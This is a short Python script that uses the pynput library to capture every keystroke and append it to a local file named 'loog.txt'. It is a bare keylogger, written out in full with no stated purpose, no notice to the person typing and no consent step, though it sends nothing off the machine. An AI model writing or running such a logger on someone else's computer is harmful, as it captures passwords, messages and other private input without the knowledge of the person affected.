import pynput
with open("loog.txt", "w") as log:
    log.write("")




def onpress(key):
    with open("loog.txt", "a") as log:
        log.write(f"{key}\n")

with pynput.keyboard.Listener(on_press=onpress) as listener:
    listener.join()
